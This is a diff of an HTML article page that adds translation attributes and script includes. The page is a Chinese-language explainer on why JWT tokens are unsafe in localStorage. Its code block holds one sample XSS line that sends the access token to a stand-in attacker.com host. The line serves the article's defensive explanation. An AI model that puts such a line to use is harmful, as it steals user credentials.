@@ -24,30 +24,26 @@
           <span>825412.xyz</span>
         </a>
         <span style="color: #64748b;">/</span>
-        <a href="/sitemap.html" style="color: #06b6d4; font-size: 14px; font-weight: 600; text-decoration: none;">极客技术专栏</a>
+        <a href="/sitemap.html" style="color: #06b6d4; font-size: 14px; font-weight: 600; text-decoration: none;" data-i18n="nav_articles">极客技术专栏</a>
       </div>
       <nav style="display: flex; align-items: center; gap: 14px; flex-wrap: wrap; font-size: 13px;">
-        <a href="/" style="color: var(--text-secondary); text-decoration: none;">控制台</a>
-        <a href="/toolbox.html" style="color: var(--text-secondary); text-decoration: none;">工具箱</a>
-        <a href="/airdrop.html" style="color: var(--text-secondary); text-decoration: none;">隔空快传</a>
-        <a href="/webhook.html" style="color: var(--text-secondary); text-decoration: none;">Webhook 调试</a>
-        <a href="/clipboard.html" style="color: var(--text-secondary); text-decoration: none;">匿名剪贴板</a>
-        <a href="/sitemap.html" style="color: var(--color-primary); font-weight: 700; text-decoration: none;">全站索引</a>
+        <a href="/" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_dashboard">控制台</a>
+        <a href="/toolbox.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_toolbox">极客工具箱</a>
+        <a href="/airdrop.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_airdrop">隔空快传</a>
+        <a href="/webhook.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_webhook">Webhook 调试</a>
+        <a href="/clipboard.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_clipboard">匿名剪贴板</a>
+        <a href="/sitemap.html" style="color: var(--color-primary); font-weight: 700; text-decoration: none;" data-i18n="nav_sitemap">全站索引</a>
       </nav>
     </div>
   </header>
   <main style="max-width: 900px; margin: 40px auto; padding: 0 20px;">
     <div style="margin-bottom: 30px;">
-      <div style="display: flex; gap: 8px; margin-bottom: 12px;">
-        <span style="background: rgba(239,68,68,0.15); color: #f87171; font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 6px;">Web 安全</span>
-        <span style="background: rgba(139,92,246,0.15); color: #c084fc; font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 6px;">JWT 架构</span>
-        <span style="color: var(--text-muted); font-size: 12px; align-self: center;">发布时间：2026-08-31 · 阅读时长：9 分钟</span>
-      </div>
-      <h1 style="font-size: 28px; font-weight: 800; color: #fff; line-height: 1.4; margin-bottom: 12px;">Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？</h1>
-      <p style="font-size: 15px; color: var(--text-secondary); line-height: 1.6;">许多前端开发者习惯将 Access Token 随手存入 window.localStorage，但这为跨站脚本攻击 (XSS) 敞开了致命大门。本文为您梳理最佳防御范式。</p>
+      
+      <h1 style="font-size: 28px; font-weight: 800; color: #fff; line-height: 1.4; margin-bottom: 12px;" data-i18n="art4_title">Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？</h1>
+      <p style="font-size: 15px; color: var(--text-secondary); line-height: 1.6;" data-i18n="art4_sub">许多前端开发者习惯将 Access Token 随手存入 window.localStorage，但这为跨站脚本攻击 (XSS) 敞开了致命大门。本文为您梳理最佳防御范式。</p>
     </div>
 
-    <article class="doc-card" style="line-height: 1.8; font-size: 15px; color: var(--text-primary);">
+    <article class="doc-card" style="line-height: 1.8; font-size: 15px; color: var(--text-primary);" data-i18n="art4_body">
       <h2>一、LocalStorage 的致命软肋：对任意 JavaScript 完全开放</h2>
       <p>任何运行在当前页面上下文的 JavaScript 脚本（包括第三方分析 SDK、未严格清洗的用户评论富文本、被篡改的 NPM 依赖包），都可以通过一行简单的代码直接读取并外发凭据：</p>
       <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));</code></pre>
@@ -65,14 +61,16 @@
     </article>
   </main>
   <footer style="border-top: 1px solid rgba(255,255,255,0.08); padding: 30px 20px; margin-top: 60px; text-align: center; font-size: 13px; color: var(--text-muted); background: rgba(6, 14, 32, 0.5);">
-    <div style="margin-bottom: 12px;"><span>© 2026 825412.xyz 极客多功能工具箱 | 开发者原创技术文库</span></div>
+    <div style="margin-bottom: 12px;"><span data-i18n="footer_rights_articles">© 2026 825412.xyz 极客多功能工具箱 | 开发者原创技术文库</span></div>
     <div style="display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; margin-bottom: 10px;">
-      <a href="/about.html" style="color: var(--text-secondary); text-decoration: none;">关于本站</a>
-      <a href="/privacy.html" style="color: var(--text-secondary); text-decoration: none;">隐私政策</a>
-      <a href="/terms.html" style="color: var(--text-secondary); text-decoration: none;">服务条款</a>
-      <a href="/contact.html" style="color: var(--text-secondary); text-decoration: none;">联系我们</a>
-      <a href="/sitemap.html" style="color: var(--text-secondary); text-decoration: none;">HTML 网站地图</a>
+      <a href="/about.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_about">关于本站</a>
+      <a href="/privacy.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_privacy">隐私政策</a>
+      <a href="/terms.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_terms">服务条款</a>
+      <a href="/contact.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_contact">联系我们</a>
+      <a href="/sitemap.html" style="color: var(--text-secondary); text-decoration: none;" data-i18n="nav_sitemap_html">HTML 网站地图</a>
     </div>
   </footer>
+  <script src="../js/storage.js?v=2.7.0"></script>
+  <script src="../js/i18n.js?v=2.7.0"></script>
 </body>
 </html>
